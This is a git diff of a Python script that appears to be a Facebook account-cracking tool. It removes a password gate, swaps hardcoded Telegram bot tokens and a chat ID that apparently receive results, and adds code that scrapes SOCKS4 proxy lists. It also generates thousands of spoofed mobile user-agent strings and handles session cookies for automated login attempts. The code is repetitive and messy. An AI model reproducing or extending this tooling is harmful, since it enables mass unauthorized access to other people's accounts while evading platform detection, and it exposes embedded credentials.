@@ -1,22 +1,3 @@
-print('\033[1;32m')
-print('-----------------------------------------------------------')
-print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
-print('-----------------------------------------------------------')
-print('-----------------------------------------------------------')
-print('\033[1;35m ادخل كلمه السر')
-print('\033[1;32m')
-print('-----------------------------------------------------------')
-print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
-print('-----------------------------------------------------------')
-name = input ('Entre password : \033[1;34m')
-print('\033[1;32m')
-print('\033[132m-----------------------------------------------------------')
-if name == 'NADER19' : 
-	print('\033[1;35m كلمه السر صح')
-	print ('اهلا وسهلا بك في اداتي')
-else :
-   print ('\033[1;31m كلمه السر غلط ')
-   exit()
 import webbrowser
 import requests,time,pyfiglet,datetime
 now = datetime.datetime.today()
@@ -82,44 +63,34 @@ from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
 import os
-import webbrowser
+
+try:
+        
+        import rich
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
+        os.system('pip install rich')
+try:
+        import stdiomask
+except ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
+        os.system('pip install stdiomask')
 try:
 	import requests
 except ImportError:
-	    Z = '\033[1;31m' #احمر
-Z = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-F = '\033[2;32m' #اخضر
-A = '\033[2;34m'#ازرق
-G = '\033[2;35m' #وردي
-B = '\033[2;36m'#سمائي
-Y = '\033[1;34m' #ازرق فاتح
-C = "\033[1;97m" #ابيض
-GG = '\033[1;32m' #أخضر
-B = '\033[2;36m' #سمائيہ
-W = '\x1b[1;37m' #أبیضہ
-P = '\033[2;35m' #زهريہ
-N = '\033[1;34m' #نهديہ
-Z = '\033[2;34m' #أزرقہ
-X = '\033[1;33m' #أصفر
-R = '\033[1;31m' #أحمر
-Z = '\033[1;31m' #احمر
+	Z = '\033[1;31m' #احمر
 R = '\033[1;31m' #احمر
 X = '\033[1;33m' #اصفر
 F = '\033[2;32m' #اخضر
 C = "\033[1;97m" #ابيض
 B = '\033[2;36m'#سمائي
 Y = '\033[1;34m' #ازرق فاتح.
-Z1 = '\033[2;31m' #احمر ثاني
-Z = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-F = '\033[2;32m' #اخضر
-A = '\033[2;34m'#ازرق
-C = '\033[2;35m' #وردي
-B = '\033[2;36m'#سمائي
-Y = '\033[1;34m' #ازرق فاتح
-print(f'الاده المدفوعه ✅')
-token=('6601400015:AAGBb6nzpKWswSLSmX_VfC_pDZv2Zyvx6sI')
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+print('\n')
+token=('6428563721:AAFNWBZoiaWix5zFtQOfzyD38eoedrgX30U')
 print('\n')
 ID=('777493054')
 os.system('clear')
@@ -127,62 +98,200 @@ cetak(nel('\t• Sedang Menginstall Modul Requests •'))
 
 
 pretty.install()
-CON=sol()
+CON=sol() 
+user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; zh-cn; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi 8A Pro Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; Redmi 8A Pro Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/50.0.2254.149183','Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.7.27 swan-mibrowser']
+uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
+uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
+uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
+uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
+uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
+uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
+uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
+uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
+uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
 ugen2=[]
 ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	
+	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
+	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
-
+	print(' ')
+prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
-	a='Mozilla/5.0 (Symbian/3; Series60/'
+	a='Mozilla/5.0 (Linux; Android'
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
-	d='Nokia'
+	d='11; Redmi Note 5A Lite)'
 	e=random.randrange(100, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	f='AppleWebKit/537.36 (KHTML, like Gecko)'
 	g=random.randrange(1, 9)
 	h=random.randrange(1, 4)
 	i=random.randrange(1, 4)
 	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1'
+	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen2.append(uaku)
-
-
-	aa='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
-	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,106)
-	f='0'
-	g=random.randrange(3904,5000)
-	h=random.randrange(40,100)
-	i='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
-	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
-for x in range(10):
-	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
-	b=random.randrange(100, 9999)
-	c=random.randrange(100, 9999)
+	
+	aa='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['M2101K6G'])
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
-	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-
+	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['RMX3396'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='Mozilla/5.0 (Linux; Android 13;'
+	b=random.choice(['8.1.0','9','10','11','12','13'])
+	c=random.choice(['RMX3396'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	a='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['9','10','11','12'])
+	c=random.choice(['V2147'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
+	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	
+	ugen.append(uaku2)
 		
-#------------[ NADER ]---------------#
+	
+	aa='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['2201116PG'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/107.0.0.0 Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['SHARK KTUS-H0'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/107.0.0.0 Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+		
+	aa='Mozilla/5.0 (iPhone;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='Mozilla/5.0 (Linux; Android 11;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['Infinix X688B'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/107.0.0.0 Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+		
+					
+	aa='Mozilla/5.0 (Linux; Android 10;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
@@ -207,7 +316,7 @@ kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
-#--------------------[ NADER ]--------------#
+#--------------------[ HHNI ]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
@@ -314,7 +423,7 @@ class Login:
 
     def get_proxy(self):
         rest = []
-        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"})
+        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
         gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
         reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
         for x in reg:
@@ -356,12 +465,12 @@ class Login:
         	def back():
         		llogin()
         	def banner():
-        		print(f'''⋘NADER𖤍⋙''')
+        		print(f'''⋘NADER⋙''')
         exit()
         
 
 
-        ykh = input(f"{H}[{M}+{H}]{N} NADER ")
+        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
         if ykh in ["", " "]:
             print("[!] jangan kosong");time.sleep(2);self.menu()
         elif ykh in ["1", "01"]:
@@ -471,7 +580,7 @@ class Login:
             self.menu()
         else:print("[!] input yang bnr");time.sleep(2);self.menu()
 
-#--------------  NADER -------------------
+#-------------- NADER -------------------
     def batur(self, link, coki):
         try:
             kontol = self.ses.get(link, cookies=coki).text
@@ -624,7 +733,7 @@ def back():
 	llogin()
 
 def banner():
-	print(f'''<<NADER>>''')
+	print(f'''⋘NADER⋙''')
 
 def llogin():
 	try:
@@ -711,32 +820,25 @@ def login_lagi334():
 	except:pass
 
 
-# ABBAS
+# HANI
+
 def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	
 	os.system('clear')
 	banner()
-	print(Z+' ♕[في حال تم ايقاف الاده راسل المطور للتفعيل @nader20090')
-	print(F+          'مدفوعه')
-	print(f'═══════════════════════════════════════════════════════════════')
-	print('[VIP]')
-	print(f'═══════════════════════════════════════════════════════════════')
-	print(f'»  Your ID : '+str(my_id))
-	print(f'═══════════════════════════════════════════════════════════════')
-	print(f'═══════════════════════════════════════════════════════════════')
-	print(f'»  Your IP : {ip}')
-	print(f'═══════════════════════════════════════════════════════════════')
+	
+	print('\033[1;32mTelegram ᯼ @N_0_N_7')
+	print('[NADER]')
+	print(f'\033[1;32m»  Your ID : '+str(my_id))
+	print(f'\033[1;32m»  Your IP : {ip}')
 	print('')
-	print('\033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - من اصدقاء')
-	print(f'═══════════════════════════════════════════════════════════════')
-	print('\033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - من المتابعين')
-	print(f'═══════════════════════════════════════════════════════════════')
